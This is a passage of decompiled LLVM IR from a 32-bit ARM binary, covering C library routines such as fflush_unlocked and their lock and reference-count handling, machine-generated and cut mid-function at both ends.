dec_label_pc_161e4:                               ; preds = %.thread38, %bb52
  %v0_161e4 = phi i32 [ %v0_161e4.pre, %bb52 ], [ %v3_161b8, %.thread38 ]
  store i32 %v0_161e4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_161e8 = icmp eq i32 %v0_161e4, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_161e8, label %dec_label_pc_161f4, label %dec_label_pc_161ac

dec_label_pc_161f4:                               ; preds = %dec_label_pc_161e4, %dec_label_pc_16180
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_161f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_161f8 = add i32 %v0_161f8, 152
  %v3_161f8 = inttoptr i32 %v2_161f8 to i32*
  %v4_161f8 = load i32, i32* %v3_161f8, align 4
  store i32 %v4_161f8, i32* %r0.global-to-local, align 4
  %v1_161fc = add i32 %v4_161f8, 4
  %v2_161fc = inttoptr i32 %v1_161fc to i32*
  %v3_161fc = load i32, i32* %v2_161fc, align 4
  %v1_16200 = add i32 %v3_161fc, -1
  store i32 %v1_16200, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16204 = icmp eq i32 %v1_16200, 0
  store i32 %v1_16200, i32* %v2_161fc, align 4
  br i1 %v2_16204, label %dec_label_pc_16210, label %dec_label_pc_16270

dec_label_pc_16210:                               ; preds = %dec_label_pc_161f4
  %v0_16210 = load i32, i32* %r3.global-to-local, align 4
  %v1_16210 = load i32, i32* %r0.global-to-local, align 4
  %v2_16210 = add i32 %v1_16210, 8
  %v3_16210 = inttoptr i32 %v2_16210 to i32*
  store i32 %v0_16210, i32* %v3_16210, align 4
  %v0_16214 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16214, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16218

dec_label_pc_16218:                               ; preds = %dec_label_pc_16248.dec_label_pc_16218_crit_edge, %dec_label_pc_16210
  %v0_16218 = phi i32 [ %v0_16218.pre, %dec_label_pc_16248.dec_label_pc_16218_crit_edge ], [ %v0_16214, %dec_label_pc_16210 ]
  %v1_16218 = inttoptr i32 %v0_16218 to i32*
  %v2_16218 = load i32, i32* %v1_16218, align 4
  store i32 %v2_16218, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16218, i32* %r2.global-to-local, align 4
  %v2_1622474 = load i32, i32* %v1_16218, align 4
  store i32 %v2_1622474, i32* %r3.global-to-local, align 4
  %v3_1622876 = icmp uge i32 %v2_1622474, %v2_16218
  store i1 %v3_1622876, i1* %cpsr_c.global-to-local, align 1
  %v9_1622882 = icmp eq i32 %v2_1622474, %v2_16218
  br i1 %v9_1622882, label %dec_label_pc_16230, label %dec_label_pc_16248

dec_label_pc_16230:                               ; preds = %dec_label_pc_16218, %dec_label_pc_16230.dec_label_pc_16224_crit_edge
  %v0_1623083 = phi i32 [ %v1_16228.pre, %dec_label_pc_16230.dec_label_pc_16224_crit_edge ], [ %v2_16218, %dec_label_pc_16218 ]
  store i32 %v0_1623083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16240 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16240, label %dec_label_pc_16244, label %dec_label_pc_16230.dec_label_pc_16224_crit_edge

dec_label_pc_16230.dec_label_pc_16224_crit_edge:  ; preds = %dec_label_pc_16230
  %v0_16224.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16228.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16224 = inttoptr i32 %v0_16224.pre to i32*
  %v2_16224 = load i32, i32* %v1_16224, align 4
  store i32 %v2_16224, i32* %r3.global-to-local, align 4
  %v3_16228 = icmp uge i32 %v2_16224, %v1_16228.pre
  store i1 %v3_16228, i1* %cpsr_c.global-to-local, align 1
  %v9_16228 = icmp eq i32 %v2_16224, %v1_16228.pre
  br i1 %v9_16228, label %dec_label_pc_16230, label %dec_label_pc_16248

dec_label_pc_16244:                               ; preds = %dec_label_pc_16230
  %v0_16244 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16244, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16248

dec_label_pc_16248:                               ; preds = %dec_label_pc_16218, %dec_label_pc_16230.dec_label_pc_16224_crit_edge, %dec_label_pc_16244
  %v0_16250 = phi i32 [ %v0_16244, %dec_label_pc_16244 ], [ %v2_1622474, %dec_label_pc_16218 ], [ %v2_16224, %dec_label_pc_16230.dec_label_pc_16224_crit_edge ]
  %v1_16248 = phi i32 [ %v0_16244, %dec_label_pc_16244 ], [ %v2_16218, %dec_label_pc_16218 ], [ %v1_16228.pre, %dec_label_pc_16230.dec_label_pc_16224_crit_edge ]
  %v3_16248 = icmp uge i32 %v0_16250, %v1_16248
  store i1 %v3_16248, i1* %cpsr_c.global-to-local, align 1
  %v9_16248 = icmp eq i32 %v0_16250, %v1_16248
  br i1 %v9_16248, label %dec_label_pc_16250, label %dec_label_pc_16248.dec_label_pc_16218_crit_edge

dec_label_pc_16248.dec_label_pc_16218_crit_edge:  ; preds = %dec_label_pc_16248
  %v0_16218.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16218

dec_label_pc_16250:                               ; preds = %dec_label_pc_16248
  %v2_16250 = icmp ne i32 %v1_16248, 0
  store i1 %v2_16250, i1* %cpsr_c.global-to-local, align 1
  %v7_16254 = icmp slt i32 %v1_16248, 2
  br i1 %v7_16254, label %dec_label_pc_16270, label %dec_label_pc_16258

dec_label_pc_16258:                               ; preds = %dec_label_pc_16250
  %v0_16258 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16258, i32* %r0.global-to-local, align 4
  %v0_1625c = load i32, i32* %r1.global-to-local, align 4
  %v1_1625c = add i32 %v0_1625c, 129
  store i32 %v1_1625c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16270

dec_label_pc_16270:                               ; preds = %dec_label_pc_161f4, %dec_label_pc_16258, %dec_label_pc_16250
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16274 = load i32, i32* %r5.global-to-local, align 4
  %v2_16274 = add i32 %v0_16274, 80
  %v3_16274 = inttoptr i32 %v2_16274 to i32*
  %v4_16274 = load i32, i32* %v3_16274, align 4
  store i32 %v4_16274, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1627c = inttoptr i32 %v4_16274 to i32*
  store i32 0, i32* %v2_1627c, align 4
  br label %dec_label_pc_16280

dec_label_pc_16280:                               ; preds = %dec_label_pc_160f4, %dec_label_pc_1611c, %dec_label_pc_16270
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16284 = load i32, i32* %r5.global-to-local, align 4
  %v2_16284 = add i32 %v0_16284, 160
  %v3_16284 = inttoptr i32 %v2_16284 to i32*
  %v4_16284 = load i32, i32* %v3_16284, align 4
  store i32 %v4_16284, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1628c = add i32 %v0_16284, 12
  %v3_1628c = inttoptr i32 %v2_1628c to i32*
  %v4_1628c = load i32, i32* %v3_1628c, align 4
  store i32 %v4_1628c, i32* %r1.global-to-local, align 4
  %v1_16290 = add i32 %v4_16284, 4
  %v2_16290 = inttoptr i32 %v1_16290 to i32*
  %v3_16290 = load i32, i32* %v2_16290, align 4
  store i32 %v3_16290, i32* %r2.global-to-local, align 4
  %v1_16294 = inttoptr i32 %v4_1628c to i32*
  %v2_16294 = load i32, i32* %v1_16294, align 4
  %v1_16298 = add i32 %v3_16290, -1
  store i32 %v1_16298, i32* %r2.global-to-local, align 4
  %v1_1629c = add i32 %v2_16294, -1
  store i32 %v1_1629c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_162a0 = icmp eq i32 %v1_16298, 0
  store i32 %v1_1629c, i32* %v1_16294, align 4
  %v0_162a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_162a8 = load i32, i32* %r0.global-to-local, align 4
  %v2_162a8 = add i32 %v1_162a8, 4
  %v3_162a8 = inttoptr i32 %v2_162a8 to i32*
  store i32 %v0_162a8, i32* %v3_162a8, align 4
  br i1 %v2_162a0, label %dec_label_pc_162b0, label %dec_label_pc_16310

dec_label_pc_162b0:                               ; preds = %dec_label_pc_16280
  %v0_162b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_162b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_162b0 = add i32 %v1_162b0, 8
  %v3_162b0 = inttoptr i32 %v2_162b0 to i32*
  store i32 %v0_162b0, i32* %v3_162b0, align 4
  %v0_162b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_162b4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_162b8

dec_label_pc_162b8:                               ; preds = %dec_label_pc_162e8.dec_label_pc_162b8_crit_edge, %dec_label_pc_162b0
  %v0_162b8 = phi i32 [ %v0_162b8.pre, %dec_label_pc_162e8.dec_label_pc_162b8_crit_edge ], [ %v0_162b4, %dec_label_pc_162b0 ]
  %v1_162b8 = inttoptr i32 %v0_162b8 to i32*
  %v2_162b8 = load i32, i32* %v1_162b8, align 4
  store i32 %v2_162b8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_162b8, i32* %r2.global-to-local, align 4
  %v2_162c462 = load i32, i32* %v1_162b8, align 4
  store i32 %v2_162c462, i32* %r3.global-to-local, align 4
  %v3_162c864 = icmp uge i32 %v2_162c462, %v2_162b8
  store i1 %v3_162c864, i1* %cpsr_c.global-to-local, align 1
  %v9_162c870 = icmp eq i32 %v2_162c462, %v2_162b8
  br i1 %v9_162c870, label %dec_label_pc_162d0, label %dec_label_pc_162e8

dec_label_pc_162d0:                               ; preds = %dec_label_pc_162b8, %dec_label_pc_162d0.dec_label_pc_162c4_crit_edge
  %v0_162d071 = phi i32 [ %v1_162c8.pre, %dec_label_pc_162d0.dec_label_pc_162c4_crit_edge ], [ %v2_162b8, %dec_label_pc_162b8 ]
  store i32 %v0_162d071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_162e0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_162e0, label %dec_label_pc_162e4, label %dec_label_pc_162d0.dec_label_pc_162c4_crit_edge

dec_label_pc_162d0.dec_label_pc_162c4_crit_edge:  ; preds = %dec_label_pc_162d0
  %v0_162c4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_162c8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_162c4 = inttoptr i32 %v0_162c4.pre to i32*
  %v2_162c4 = load i32, i32* %v1_162c4, align 4
  store i32 %v2_162c4, i32* %r3.global-to-local, align 4
  %v3_162c8 = icmp uge i32 %v2_162c4, %v1_162c8.pre
  store i1 %v3_162c8, i1* %cpsr_c.global-to-local, align 1
  %v9_162c8 = icmp eq i32 %v2_162c4, %v1_162c8.pre
  br i1 %v9_162c8, label %dec_label_pc_162d0, label %dec_label_pc_162e8

dec_label_pc_162e4:                               ; preds = %dec_label_pc_162d0
  %v0_162e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_162e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_162e8

dec_label_pc_162e8:                               ; preds = %dec_label_pc_162b8, %dec_label_pc_162d0.dec_label_pc_162c4_crit_edge, %dec_label_pc_162e4
  %v0_162f0 = phi i32 [ %v0_162e4, %dec_label_pc_162e4 ], [ %v2_162c462, %dec_label_pc_162b8 ], [ %v2_162c4, %dec_label_pc_162d0.dec_label_pc_162c4_crit_edge ]
  %v1_162e8 = phi i32 [ %v0_162e4, %dec_label_pc_162e4 ], [ %v2_162b8, %dec_label_pc_162b8 ], [ %v1_162c8.pre, %dec_label_pc_162d0.dec_label_pc_162c4_crit_edge ]
  %v3_162e8 = icmp uge i32 %v0_162f0, %v1_162e8
  store i1 %v3_162e8, i1* %cpsr_c.global-to-local, align 1
  %v9_162e8 = icmp eq i32 %v0_162f0, %v1_162e8
  br i1 %v9_162e8, label %dec_label_pc_162f0, label %dec_label_pc_162e8.dec_label_pc_162b8_crit_edge

dec_label_pc_162e8.dec_label_pc_162b8_crit_edge:  ; preds = %dec_label_pc_162e8
  %v0_162b8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_162b8

dec_label_pc_162f0:                               ; preds = %dec_label_pc_162e8
  %v2_162f0 = icmp ne i32 %v1_162e8, 0
  store i1 %v2_162f0, i1* %cpsr_c.global-to-local, align 1
  %v7_162f4 = icmp slt i32 %v1_162e8, 2
  br i1 %v7_162f4, label %dec_label_pc_16310, label %dec_label_pc_162f8

dec_label_pc_162f8:                               ; preds = %dec_label_pc_162f0
  %v0_162f8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_162f8, i32* %r0.global-to-local, align 4
  %v0_162fc = load i32, i32* %r1.global-to-local, align 4
  %v1_162fc = add i32 %v0_162fc, 129
  store i32 %v1_162fc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16310

dec_label_pc_16310:                               ; preds = %dec_label_pc_16280, %dec_label_pc_162f8, %dec_label_pc_162f0
  %v2_16314 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16314, i32* %r4.global-to-local, align 4
  %v1_16318 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16318

; uselistorder directives
  uselistorder i32 %v0_162e4, { 1, 0, 2 }
  uselistorder i32 %v1_162c8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_162b8, { 1, 0 }
  uselistorder i32 %v0_16244, { 1, 0, 2 }
  uselistorder i32 %v1_16228.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16218, { 1, 0 }
  uselistorder i32 %v0_161e4, { 2, 1, 0 }
  uselistorder i32 %v0_16188, { 1, 0 }
  uselistorder i32 %v0_1616c, { 1, 0, 2 }
  uselistorder i32 %v1_16150.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1613c, { 1, 0 }
  uselistorder i32 %v0_160e0, { 1, 0, 2 }
  uselistorder i32 %v1_160c4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16098, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 10, 11, 13, 12, 42, 14, 15, 16, 40, 41, 17, 18, 19, 20, 21, 22, 23, 25, 24, 43, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 44, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 22, 23, 4, 5, 6, 8, 7, 0, 9, 12, 10, 11, 21, 13, 14, 24, 25, 15, 16, 17, 18, 19, 26, 27, 20 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 2, 0, 5, 3, 4, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16310, { 1, 2, 0 }
  uselistorder label %dec_label_pc_162e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_162d0, { 1, 0 }
  uselistorder label %dec_label_pc_16280, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16270, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16248, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16230, { 1, 0 }
  uselistorder label %dec_label_pc_161e4, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_161ac, { 1, 0 }
  uselistorder label %dec_label_pc_16180, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_16170, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16158, { 1, 0 }
  uselistorder label %dec_label_pc_160f4, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_160e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_160cc, { 1, 0 }
}

define i32 @function_16320(i32 %arg1) local_unnamed_addr {
dec_label_pc_16320:
  %v0_16320 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16320, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16320
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16320, %bb
  %v10_16334 = phi i32 [ %arg1, %dec_label_pc_16320 ], [ 0, %bb ]
  ret i32 %v10_16334

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_16338 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r6, align 4
  %v4_16348 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 76) to i32*), align 4
  store i32 %v4_16348, i32* %r3.global-to-local, align 4
  %v4_1634c = icmp uge i32 %tmp, %v4_16348
  store i1 %v4_1634c, i1* %cpsr_c.global-to-local, align 1
  %v10_1634c = icmp eq i32 %tmp, %v4_16348
  br i1 %v10_1634c, label %bb, label %dec_label_pc_16364

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_16374

dec_label_pc_16364:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_16368 = icmp eq i16* %arg1, null
  br i1 %v3_16368, label %dec_label_pc_16374, label %dec_label_pc_16688

dec_label_pc_16374:                               ; preds = %bb, %dec_label_pc_16364
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_16364 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_16378 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 160) to i32*), align 4
  store i32 %v4_16378, i32* %r5.global-to-local, align 4
  %v0_1637c = call i32 @__aeabi_read_tp()
  store i32 %v0_1637c, i32* %r0.global-to-local, align 4
  %v1_16380 = add i32 %v4_16378, 8
  %v2_16380 = inttoptr i32 %v1_16380 to i32*
  %v3_16380 = load i32, i32* %v2_16380, align 4
  store i32 %v3_16380, i32* %r3.global-to-local, align 4
  %v1_16384 = add i32 %v0_1637c, -1168
  store i32 %v1_16384, i32* %r8.global-to-local, align 4
  %v3_16388 = icmp uge i32 %v3_16380, %v1_16384
  store i1 %v3_16388, i1* %cpsr_c.global-to-local, align 1
  %v9_16388 = icmp eq i32 %v3_16380, %v1_16384
  br i1 %v9_16388, label %dec_label_pc_163d0, label %dec_label_pc_16390

dec_label_pc_16390:                               ; preds = %dec_label_pc_16374
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16378, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1639c143 = inttoptr i32 %v4_16378 to i32*
  %v2_1639c144 = load i32, i32* %v1_1639c143, align 4
  store i32 %v2_1639c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_163a0146 = icmp eq i32 %v2_1639c144, 0
  br i1 %v9_163a0146, label %dec_label_pc_163a8, label %dec_label_pc_163c0

dec_label_pc_163a8:                               ; preds = %dec_label_pc_16390, %dec_label_pc_163a8.dec_label_pc_1639c_crit_edge
  %v0_163a8147 = phi i32 [ %v1_163a0.pre, %dec_label_pc_163a8.dec_label_pc_1639c_crit_edge ], [ 0, %dec_label_pc_16390 ]
  store i32 %v0_163a8147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_163b8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_163b8, label %dec_label_pc_163bc, label %dec_label_pc_163a8.dec_label_pc_1639c_crit_edge

dec_label_pc_163a8.dec_label_pc_1639c_crit_edge:  ; preds = %dec_label_pc_163a8
  %v0_1639c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_163a0.pre = load i32, i32* @r4, align 4
  %v1_1639c = inttoptr i32 %v0_1639c.pre to i32*
  %v2_1639c = load i32, i32* %v1_1639c, align 4
  store i32 %v2_1639c, i32* %r3.global-to-local, align 4
  %v3_163a0 = icmp uge i32 %v2_1639c, %v1_163a0.pre
  store i1 %v3_163a0, i1* %cpsr_c.global-to-local, align 1
  %v9_163a0 = icmp eq i32 %v2_1639c, %v1_163a0.pre
  br i1 %v9_163a0, label %dec_label_pc_163a8, label %dec_label_pc_163c0

dec_label_pc_163bc:                               ; preds = %dec_label_pc_163a8
  %v0_163bc = load i32, i32* @r4, align 4
  store i32 %v0_163bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_163c0

dec_label_pc_163c0:                               ; preds = %dec_label_pc_16390, %dec_label_pc_163a8.dec_label_pc_1639c_crit_edge, %dec_label_pc_163bc
  %v0_163c0 = phi i32 [ %v0_163bc, %dec_label_pc_163bc ], [ %v2_1639c144, %dec_label_pc_16390 ], [ %v2_1639c, %dec_label_pc_163a8.dec_label_pc_1639c_crit_edge ]
  %v1_163c0 = phi i32 [ %v0_163bc, %dec_label_pc_163bc ], [ 0, %dec_label_pc_16390 ], [ %v1_163a0.pre, %dec_label_pc_163a8.dec_label_pc_1639c_crit_edge ]
  %v3_163c0 = icmp uge i32 %v0_163c0, %v1_163c0
  store i1 %v3_163c0, i1* %cpsr_c.global-to-local, align 1
  %v9_163c0 = icmp eq i32 %v0_163c0, %v1_163c0
  br i1 %v9_163c0, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_163c0
  %v1_163c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_163c4, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_163c0, %bb65
  %v1_163c8 = xor i1 %v9_163c0, true
  call void @__pseudo_cond_branch(i1 %v1_163c8, i32 ptrtoint (i32* @global_var_13c8c.468 to i32))
  %v0_163cc = load i32, i32* %r8.global-to-local, align 4
  %v1_163cc = load i32, i32* %r5.global-to-local, align 4
  %v2_163cc = add i32 %v1_163cc, 8
  %v3_163cc = inttoptr i32 %v2_163cc to i32*
  store i32 %v0_163cc, i32* %v3_163cc, align 4
  br label %dec_label_pc_163d0

dec_label_pc_163d0:                               ; preds = %dec_label_pc_16374, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_163d4 = load i32, i32* @r6, align 4
  %v2_163d4 = add i32 %v0_163d4, 160
  %v3_163d4 = inttoptr i32 %v2_163d4 to i32*
  %v4_163d4 = load i32, i32* %v3_163d4, align 4
  store i32 %v4_163d4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_163dc = add i32 %v0_163d4, 12
  %v3_163dc = inttoptr i32 %v2_163dc to i32*
  %v4_163dc = load i32, i32* %v3_163dc, align 4
  store i32 %v4_163dc, i32* %r2.global-to-local, align 4
  %v1_163e0 = add i32 %v4_163d4, 4
  %v2_163e0 = inttoptr i32 %v1_163e0 to i32*
  %v3_163e0 = load i32, i32* %v2_163e0, align 4
  store i32 %v3_163e0, i32* %r1.global-to-local, align 4
  %v1_163e4 = inttoptr i32 %v4_163dc to i32*
  %v2_163e4 = load i32, i32* %v1_163e4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_163e8 = icmp eq i32 %v3_163e0, 0
  %v1_163ec = add i32 %v2_163e4, 1
  store i32 %v1_163ec, i32* %r3.global-to-local, align 4
  store i32 %v1_163ec, i32* %v1_163e4, align 4
  br i1 %v2_163e8, label %dec_label_pc_163f8, label %dec_label_pc_16458

dec_label_pc_163f8:                               ; preds = %dec_label_pc_163d0
  %v0_163f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_163f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_163f8 = add i32 %v1_163f8, 8
  %v3_163f8 = inttoptr i32 %v2_163f8 to i32*
  store i32 %v0_163f8, i32* %v3_163f8, align 4
  %v0_163fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_163fc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16400

dec_label_pc_16400:                               ; preds = %dec_label_pc_16430.dec_label_pc_16400_crit_edge, %dec_label_pc_163f8
  %v0_16400 = phi i32 [ %v0_16400.pre, %dec_label_pc_16430.dec_label_pc_16400_crit_edge ], [ %v0_163fc, %dec_label_pc_163f8 ]
  %v1_16400 = inttoptr i32 %v0_16400 to i32*
  %v2_16400 = load i32, i32* %v1_16400, align 4
  store i32 %v2_16400, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16400, i32* %r2.global-to-local, align 4
  %v2_1640c131 = load i32, i32* %v1_16400, align 4
  store i32 %v2_1640c131, i32* %r3.global-to-local, align 4
  %v3_16410133 = icmp uge i32 %v2_1640c131, %v2_16400
  store i1 %v3_16410133, i1* %cpsr_c.global-to-local, align 1
  %v9_16410139 = icmp eq i32 %v2_1640c131, %v2_16400
  br i1 %v9_16410139, label %dec_label_pc_16418, label %dec_label_pc_16430

dec_label_pc_16418:                               ; preds = %dec_label_pc_16400, %dec_label_pc_16418.dec_label_pc_1640c_crit_edge
  %v0_16418140 = phi i32 [ %v1_16410.pre, %dec_label_pc_16418.dec_label_pc_1640c_crit_edge ], [ %v2_16400, %dec_label_pc_16400 ]
  store i32 %v0_16418140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16428 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16428, label %dec_label_pc_1642c, label %dec_label_pc_16418.dec_label_pc_1640c_crit_edge

dec_label_pc_16418.dec_label_pc_1640c_crit_edge:  ; preds = %dec_label_pc_16418
  %v0_1640c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16410.pre = load i32, i32* @r4, align 4
  %v1_1640c = inttoptr i32 %v0_1640c.pre to i32*
  %v2_1640c = load i32, i32* %v1_1640c, align 4
  store i32 %v2_1640c, i32* %r3.global-to-local, align 4
  %v3_16410 = icmp uge i32 %v2_1640c, %v1_16410.pre
  store i1 %v3_16410, i1* %cpsr_c.global-to-local, align 1
  %v9_16410 = icmp eq i32 %v2_1640c, %v1_16410.pre
  br i1 %v9_16410, label %dec_label_pc_16418, label %dec_label_pc_16430

dec_label_pc_1642c:                               ; preds = %dec_label_pc_16418
  %v0_1642c = load i32, i32* @r4, align 4
  store i32 %v0_1642c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16430

dec_label_pc_16430:                               ; preds = %dec_label_pc_16400, %dec_label_pc_16418.dec_label_pc_1640c_crit_edge, %dec_label_pc_1642c
  %v0_16438 = phi i32 [ %v0_1642c, %dec_label_pc_1642c ], [ %v2_1640c131, %dec_label_pc_16400 ], [ %v2_1640c, %dec_label_pc_16418.dec_label_pc_1640c_crit_edge ]
  %v1_16430 = phi i32 [ %v0_1642c, %dec_label_pc_1642c ], [ %v2_16400, %dec_label_pc_16400 ], [ %v1_16410.pre, %dec_label_pc_16418.dec_label_pc_1640c_crit_edge ]
  %v3_16430 = icmp uge i32 %v0_16438, %v1_16430
  store i1 %v3_16430, i1* %cpsr_c.global-to-local, align 1
  %v9_16430 = icmp eq i32 %v0_16438, %v1_16430
  br i1 %v9_16430, label %dec_label_pc_16438, label %dec_label_pc_16430.dec_label_pc_16400_crit_edge

dec_label_pc_16430.dec_label_pc_16400_crit_edge:  ; preds = %dec_label_pc_16430
  %v0_16400.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16400

dec_label_pc_16438:                               ; preds = %dec_label_pc_16430
  %v2_16438 = icmp ne i32 %v1_16430, 0
  store i1 %v2_16438, i1* %cpsr_c.global-to-local, align 1
